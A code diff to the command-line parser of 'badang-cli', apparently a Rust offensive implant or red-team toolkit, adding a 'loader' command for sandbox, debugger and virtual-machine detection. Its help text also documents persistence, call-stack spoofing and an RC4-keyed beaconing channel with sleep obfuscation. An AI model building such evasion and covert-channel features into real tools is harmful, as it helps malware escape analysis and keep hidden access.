@@ -49,6 +49,8 @@ pub struct CLI {
     pub comms_key: String,
     pub comms_path: String,
     pub comms_use_sleep_obfs: bool,
+    pub loader_check: String,
+    pub loader_action: String,
 }
 
 impl CLI {
@@ -100,6 +102,8 @@ impl CLI {
             comms_key: String::new(),
             comms_path: String::from("/api/status"),
             comms_use_sleep_obfs: false,
+            loader_check: String::from("all"),
+            loader_action: String::from("report"),
         };
 
         let mut i = 1;
@@ -180,6 +184,7 @@ impl CLI {
                 "spoof" => cli.command = String::from("spoof"),
                 "persist" => cli.command = String::from("persist"),
                 "comms" => cli.command = String::from("comms"),
+                "loader" => cli.command = String::from("loader"),
                 "--parent" => {
                     i += 1;
                     if i < args.len() {
@@ -369,6 +374,18 @@ impl CLI {
                 "--sleep-obfs" => {
                     cli.comms_use_sleep_obfs = true;
                 }
+                "--check" => {
+                    i += 1;
+                    if i < args.len() {
+                        cli.loader_check = args[i].clone();
+                    }
+                }
+                "--action" => {
+                    i += 1;
+                    if i < args.len() {
+                        cli.loader_action = args[i].clone();
+                    }
+                }
                 _ => {
                     eprintln!("Unknown argument: {}", args[i]);
                     print_help();
@@ -412,6 +429,14 @@ impl CLI {
             process::exit(1);
         }
 
+        // Check category is required for loader command
+        if cli.command == "loader"
+            && crate::loader::CheckCategory::from_str(&cli.loader_check).is_none()
+        {
+            eprintln!("ERROR: unknown check category '{}'. Use: sandbox, debug, vm, all", cli.loader_check);
+            process::exit(1);
+        }
+
         // Payload file is required for the load command
         if cli.command == "load" && cli.payload.is_empty() {
             eprintln!("ERROR: --payload <PATH> is required for the load command.");
@@ -444,6 +469,7 @@ fn print_help() {
     println!("  spoof      Call stack management");
     println!("  persist    Persistence configuration module");
     println!("  comms      Remote communication channel");
+    println!("  loader     Pre-execution environment checks");
     println!();
     println!("OPTIONS:");
     println!("  -p, --pid <PID>       Target process ID (required)");
@@ -569,11 +595,23 @@ fn print_help() {
     println!("  --comms-key <HEX>    RC4 pre-shared key in hex (required)");
     println!("  --path <PATH>        Check-in URI path (default: /api/status)");
     println!("  --sleep-obfs         Enable memory encryption during sleep");
+    println!("  --check <CAT>        Loader check category: sandbox/debug/vm/all");
+    println!("  --action <ACT>       Loader fail action: report/exit");
     println!();
     println!("COMMS EXAMPLES:");
     println!("  badang-cli comms --host 10.0.0.1 --comms-port 443 --comms-key aabbccdd -x -c");
     println!("  badang-cli comms --host 10.0.0.1 --comms-key aabbccdd --interval 30000 --jitter 20 -x -c");
     println!("  badang-cli comms --host 10.0.0.1 --comms-key aabbccdd --sleep-obfs -x -c");
+    println!();
+    println!("LOADER OPTIONS:");
+    println!("  --check <CATEGORY>   Check category: sandbox, debug, vm, all (default: all)");
+    println!("  --action <ACTION>    On detection: report, exit (default: report)");
+    println!();
+    println!("LOADER EXAMPLES:");
+    println!("  badang-cli loader --check all -x -c");
+    println!("  badang-cli loader --check sandbox -x -c");
+    println!("  badang-cli loader --check debug --action exit -x -c");
+    println!("  badang-cli loader --check vm -x -c");
     println!();
     println!("WARNING: For authorized use only.");
 }
